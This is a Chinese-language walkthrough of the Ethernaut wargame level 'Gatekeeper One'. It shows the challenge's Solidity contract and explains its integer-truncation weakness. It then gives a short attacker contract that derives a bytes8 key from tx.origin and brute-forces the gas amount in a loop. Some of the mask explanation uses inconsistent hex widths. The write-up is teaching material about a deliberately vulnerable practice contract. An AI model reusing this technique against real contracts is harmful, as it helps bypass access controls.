### 第十三题 Gatekeeper One
### 题目
越过守门人并且注册为一个参赛者来完成这一关.
### 提示
- 想一想你在 Telephone 和 Token 关卡学到的知识.
- 你可以在 solidity 文档中更深入的了解 gasleft() 函数 (参见 Units and Global Variables 和 External Function Calls).
源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;
    modifier gateOne() {
        //要求调用者的地址 msg.sender 不能等于交易发起者的地址 tx.origin --只能是合约调用
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        //要求在调用时剩余的 gas 数量 gasleft() 对 8191 取模的结果为 0，限制调用者的gas数量
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        //_gateKey 的低 32 位必须等于低 16 位。
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        //_gateKey 的低 32 位不能等于 _gateKey 的全部 64 位。
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        //_gateKey 的低 32 位必须等于 tx.origin 的低 16 位。
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
    //满足所有修饰符条件的调用才能成功执行
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
### 知识点
1. gasleft()返回一个 uint256 类型的值，表示当前调用过程中剩余的 gas 数量。
2. 以_gateKey是0x12345678deadbeef为例uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值.
     第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可
### 解题思路&过程
1. 获取实例
2. 1号门--调用地址为合约
3. 2号门--暴力破解法--用call 时可以在后缀加上 {gas: amount}，用for循环不断测试是否成功
4. 3号门--从高位转成低位时，会造成截断和丢失，从第一个开始，uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)，要满足这个，低位的二字节必须等于低位的4字节，所以说要删除四字节中的高位的两个字节，相当于让0x111111等于0x00001111,此时掩码为0x0000FFFF，第二个需求是低位8字节必须与低位的4字节有所不同，满足第一个条件是，必须是0x00000000001111 !=0xXXXXXX00001111，此时掩码为0xFFFFFFFF0000FFFF，那么第三个掩码应用于tx.origin，并将其转换为bytes8，此时，最终结果bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
5. 部署合约
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8191; i++) { 
            (bool result,) = challengeInstance.call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
            if (result) {
                break;
            }
        }
    }
}
```
6.提交
